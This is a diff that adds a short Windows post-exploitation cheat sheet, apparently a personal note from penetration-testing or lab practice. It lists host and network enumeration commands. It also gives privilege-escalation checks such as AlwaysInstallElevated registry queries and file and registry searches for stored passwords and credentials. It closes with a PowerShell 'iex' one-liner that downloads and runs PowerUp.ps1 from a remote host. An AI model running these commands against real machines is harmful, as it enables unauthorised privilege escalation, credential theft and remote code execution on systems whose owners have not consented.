@@ -1,0 +1,41 @@
+Information Gathering
+
+*systeminfo
+*systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+*hostname
+*echo %username%
+*net users
+*net user user1
+*ipconfig /all
+*route print
+*arp -A
+*netstat -ano active network connections 
+*netsh firewall show state firewall rules.
+*netsh firewall show config
+*schtasks /query /fo LIST /v
+*tasklist /SVC
+*net start services currently running
+*DRIVERQUERY sometimes 3rd party drivers
+*echo %path%
+*accesschk.exe -dqv "C:\Python27"
+*cacls "C:\Python27" replaced by icacls
+----------------------------------------------------
+Privelege Escalation
+*wmic qfe get Caption,Description,HotFixID,InstalledOn 
+Patch numbers look at exploits
+*Config Files find all config files or database files to get credentials at times for running apps like servers
+*Powersploit
+*Windows Gather Group Policy Preference Saved Passwords through metaspolit
+*Always installed Priveleged
+ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+* The command below will search the file system for file names containing certain keywords
+dir /s *pass* == *cred* == *vnc* == *.config*
+*Search certain file types for a keyword, this can generate a lot of output.
+findstr /si password *.xml *.ini *.txt
+*Similarly the two commands below can be used to grep the registry for keywords, in this case "password".
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+------------------------------------------------------
+Payload deployment
+iex (New-Object Net.WebClient).DownloadString(‘http://10.10.14.114/PowerUp.ps1’)
